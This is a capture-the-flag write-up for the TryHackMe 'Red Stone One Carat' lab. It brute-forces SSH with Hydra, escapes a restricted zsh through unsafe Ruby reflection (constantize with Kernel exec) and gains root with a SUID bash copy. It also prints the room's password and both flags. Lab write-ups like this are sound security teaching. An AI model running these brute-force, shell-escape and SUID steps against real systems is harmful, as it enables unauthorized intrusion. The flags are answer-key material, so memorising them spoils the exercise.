# <div align="center">[Red Stone One Carat](https://tryhackme.com/room/redstoneonecarat)</div>
<div align="center">First room of the Red Stone series. Hack ruby using ruby.</div>
<br>
<div align="center">
<img width="200" height="200" alt="ec3c930d88ecfb86f9d215a48e74df98" src="https://github.com/user-attachments/assets/2df219b9-bb18-4d65-8cad-1b36ea97842b" />
</div>

Task 2. Practical Flags
Start with SSH bruteforce on user noraj.

Answer the questions below
### SSH password
```
cheeseburger
```
### user.txt
```
THM{3a106092635945849a0fbf7bac92409d}
```
### root.txt
```
THM{58e53d1324eef6265fdb97b08ed9aadf}
```
---

## Introduction
In this TryHackMe Red Stone One Carat challenge, I explored SSH enumeration, restricted shell bypass, and privilege escalation techniques. The challenge begins with a weak-password SSH login, leading to a restricted rzsh shell with limited command execution. By analyzing the provided Ruby scripts, I leveraged unsafe reflection to run system commands, enumerate local services, and eventually gain root access. This challenge is a practical exercise for anyone looking to strengthen their skills in Linux privilege escalation, restricted shell exploitation, and Ruby/Rails security vulnerabilities.

---

## Initial Reconnaissance
I began the Red Stone One Carat - TryHackMe room with a quick Nmap scan that revealed only SSH, so I focused my efforts there.
```
nmap -sV <ip>
```
Nmap output:
* Open port: **22/tcp** - `OpenSSH 7.6p1` (Ubuntu)

With only SSH exposed, I focused on credential discovery rather than web enumeration - next step: brute-forcing SSH using the room hint.

---

## Brute-forcing SSH (hint-guided)
The room provided a useful hint: the password contains `"bu"`. I used that hint to filter `rockyou.txt` for candidate passwords and then ran a password-guessing attack with Hydra.
First I generated a filtered password list:
```
grep "bu" /usr/share/wordlists/rockyou.txt > pass.txt
```
Then I launched Hydra against SSH for the user noraj:
```
hydra -l noraj -P pass.txt 10.201.116.83 ssh
```
Hydra returned a valid credential quickly:
* Username: `noraj`
* Password: `cheeseburger`

---

## Initial System Access - Restricted Shell
I logged in via SSH using the discovered credentials:
```
ssh noraj@10.201.116.83
# password: cheeseburger
```
On login I discovered I was dropped into a restricted zsh (rzsh) environment. Typical commands such as `ls`, `whoami`, and `clear` were unavailable because the PATH was restricted to `/home/noraj/bin` and common system binaries were not reachable.
Example interaction showing the restricted shell:
```
red-stone-one-carat% ls
zsh: command not found: ls
red-stone-one-carat% echo $SHELL
/bin/rzsh
red-stone-one-carat% echo $PATH
/home/noraj/bin
```
Because the shell was restricted and the PATH did not include `/bin` or `/usr/bin`, I had to rely on shell built-ins and creative techniques to inspect the filesystem.
A quick trick I used to list files (since ls wasn't available) was to use shell globbing:
```
red-stone-one-carat% echo *
bin user.txt
red-stone-one-carat% echo ./.*
./.cache ./.hint.txt ./.zcompdump.red-stone-one-carat.2446 ./.zshrc
```
---

## Capturing the User Flag
Even inside the restricted environment, I was able to read the user flag by expanding the file into the shell using a built-in:
```
red-stone-one-carat% echo "$(<user.txt)"
THM{3a106092635945849a0fbf7bac92409d}
```
---

## Post-Exploitation & Root Escalation
After capturing the user flag, I focused on post-exploitation and privilege escalation. The room included a `.hint.txt` file that suggested examining local services:
```
red-stone-one-carat% echo ./.*
./.cache ./.hint.txt ./.zcompdump ./.zshrc
Reading the hint:
red-stone-one-carat% echo "$(<.hint.txt)"
```
Maybe take a look at local services.
Inside `/home/noraj/bin`, there were two files: `rzsh` and `test.rb`. I attempted to check for Ruby, but it wasn't immediately obvious. Listing the bin directory:
```
red-stone-one-carat% echo bin/*
bin/rzsh bin/test.rb
```
Running `test.rb` printed its content:
```rb
red-stone-one-carat% test.rb
#!/usr/bin/ruby

require 'rails'

if ARGV.size == 3
    klass = ARGV[0].constantize
    obj = klass.send(ARGV[1].to_sym, ARGV[2])
else
    puts File.read(__FILE__)
end
```
The script was short, but the use of `constantize` stood out - this Ruby method can be dangerous because it allows **transforming a string into a Ruby object**, enabling code execution.

---

## Exploiting Unsafe Reflection in Ruby/Rails
The script allows executing a class method with one argument. For example:
Class: `File`
Method: `read()`
Argument: `/home/noraj/user.txt`

This could fetch the user flag. More importantly, I could use it to **escape the restricted shell**:
Class: `Kernel`
Method: `exec()`
Argument: `/bin/zsh`

Execution:
I first tried to escape the restricted shell using the Ruby script:
```
red-stone-one-carat% test.rb Kernel exec '/bin/zsh'
getent:6: command not found: grep
compdump:136: command not found: mv
```
Exporting the PATH directly at the start didn't work because of restrictions:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```  
By running the Ruby command first and then setting the full PATH, I could access system binaries and bypass the `rzsh` restrictions, allowing me to continue with further exploitation.

---

## Local Service Enumeration
I tried inspecting local services and found a helpful Ruby script (`netstat.rb`) online. I downloaded it to my system and encoded it in Base64:
```
wget https://gist.githubusercontent.com/kwilczynski/954046/raw/4571a1eed62c4f13d0a2c70c5cf5ebd45e41004e/netstat.rb
cat netstat.rb| base64 -w 0
```
I then pasted this into the target system. Note that without importing the correct `PATH`, it won't work:
```
echo 'ISMvdXNyL2Jpbi9lbnYgcnVieQoKUFJPQ19ORVRfVENQID0gJy9wcm9jL25ldC90Y3AnICAjIFRoaXMgc2hvdWxkIGFsd2F5cyBiZSB0aGUgc2FtZSAuLi4KClRDUF9TVEFURVMgPSB7ICcwMCcgPT4gJ1VOS05PV04nLCAgIyBCYWQgc3RhdGUgLi4uIEltcG9zc2libGUgdG8gYWNoaWV2ZSAuLi4KICAgICAgICAgICAgICAgJ0ZGJyA9PiAnVU5LTk9XTicsICAjIEJhZCBzdGF0ZSAuLi4gSW1wb3NzaWJsZSB0byBhY2hpZXZlIC4uLgogICAgICAgICAgICAgICAnMDEnID0+ICdFU1RBQkxJU0hFRCcsCiAgICAgICAgICAgICAgICcwMicgPT4gJ1NZTl9TRU5UJywKICAgICAgICAgICAgICAgJzAzJyA9PiAnU1lOX1JFQ1YnLAogICAgICAgICAgICAgICAnMDQnID0+ICdGSU5fV0FJVDEnLAogICAgICAgICAgICAgICAnMDUnID0+ICdGSU5fV0FJVDInLAogICAgICAgICAgICAgICAnMDYnID0+ICdUSU1FX1dBSVQnLAogICAgICAgICAgICAgICAnMDcnID0+ICdDTE9TRScsCiAgICAgICAgICAgICAgICcwOCcgPT4gJ0NMT1NFX1dBSVQnLAogICAgICAgICAgICAgICAnMDknID0+ICdMQVNUX0FDSycsCiAgICAgICAgICAgICAgICcwQScgPT4gJ0xJU1RFTicsCiAgICAgICAgICAgICAgICcwQicgPT4gJ0NMT1NJTkcnIH0gIyBOb3QgYSB2YWxpZCBzdGF0ZSAuLi4KCmlmICQwID09IF9fRklMRV9fCgogIFNURE9VVC5zeW5jID0gdHJ1ZQogIFNUREVSUi5zeW5jID0gdHJ1ZQoKICBGaWxlLm9wZW4oUFJPQ19ORVRfVENQKS5lYWNoIGRvIHxpfAoKICAgIGkgPSBpLnN0cmlwCgogICAgbmV4dCB1bmxlc3MgaS5tYXRjaCgvXlxkKy8pCgogICAgaSA9IGkuc3BsaXQoJyAnKQoKICAgIGxvY2FsLCByZW1vdGUsIHN0YXRlID0gaS52YWx1ZXNfYXQoMSwgMiwgMykKCiAgICBsb2NhbF9JUCwgbG9jYWxfcG9ydCAgID0gbG9jYWwuc3BsaXQoJzonKS5jb2xsZWN0IHsgfGl8IGkudG9faSgxNikgfQogICAgcmVtb3RlX0lQLCByZW1vdGVfcG9ydCA9IHJlbW90ZS5zcGxpdCgnOicpLmNvbGxlY3QgeyB8aXwgaS50b19pKDE2KSB9CgogICAgY29ubmVjdGlvbl9zdGF0ZSA9IFRDUF9TVEFURVMuZmV0Y2goc3RhdGUpCgogICAgbG9jYWxfSVAgID0gW2xvY2FsX0lQXS5wYWNrKCdOJykudW5wYWNrKCdDNCcpLnJldmVyc2Uuam9pbignLicpCiAgICByZW1vdGVfSVAgPSBbcmVtb3RlX0lQXS5wYWNrKCdOJykudW5wYWNrKCdDNCcpLnJldmVyc2Uuam9pbignLicpCgogICAgICBwdXRzICIje2xvY2FsX0lQfToje2xvY2FsX3BvcnR9ICIgKwogICAgICAgICIje3JlbW90ZV9JUH06I3tyZW1vdGVfcG9ydH0gI3tjb25uZWN0aW9uX3N0YXRlfSIKICBlbmQKCiAgZXhpdCgwKQplbmQ=' | base64 -d > netstat.rb
```
Running it revealed listening services:
```
red-stone-one-carat% ruby netstat.rb
127.0.0.53:53 0.0.0.0:0 LISTEN
0.0.0.0:22 0.0.0.0:0 LISTEN
127.0.0.1:31547 0.0.0.0:0 LISTEN
10.10.203.226:22 10.18.88.214:35166 ESTABLISHED
```
Port `31547` was listening locally, so I connected with Netcat:
```
red-stone-one-carat% nc 127.0.0.1 31547
$ whoami
undefined local variable or method `whoami' for main:Object
The shell was still restricted, so I needed a SUID bash payload.
```
---

## Escaping to Root
To escalate privileges, I copied `bash` to `/tmp` and set the SUID bit:
```
exec %q!cp /bin/bash /tmp/bash; chmod +s /tmp/bash!
```
With this payload, I could spawn a root shell:
```
/tmp/bash -p
```
## Captured the Root Flag.txt
```
bash-4.4# cat /root/root.txt
THM{58e53d1324eef6265fdb97b08ed9aadf}
```
<img width="1198" height="587" alt="2025-09-21 20_34_37-Untitled - Notepad" src="https://github.com/user-attachments/assets/f9494e18-686a-4268-a1a6-67c5c21323cf" />

## Conclusion
In this Red Stone One Carat TryHackMe challenge, I first gained SSH access using a weak password but landed in a restricted rzsh shell. By analyzing the Ruby script (test.rb), I exploited unsafe reflection to execute system commands and bypass the restrictions. Using the Ruby-based netstat.rb script, I discovered a locally listening port, spawned a secondary shell, and finally escalated to root with a SUID bash payload to capture the root flag.
This challenge provided an excellent hands-on exercise in SSH enumeration, restricted shell bypass, Ruby exploitation, local service enumeration, and privilege escalation - all while navigating limited tools and restrictions.

### References:
* Restricted shell escape walkthrough](https://github.com/Elnatty/tryhackme_labs/blob/main/86-red-stone-one-carat-restricted-shell-escape-with-ruby.md)
* netstat.rb script](https://gist.githubusercontent.com/kwilczynski/954046/raw/4571a1eed62c4f13d0a2c70c5cf5ebd45e41004e/netstat.rb)
* Blog write-up](https://blog.raw.pm/en/TryHackMe-Red-Stone-One-Carat-write-up/)

Thanks to both authors for their helpful walkthroughs!
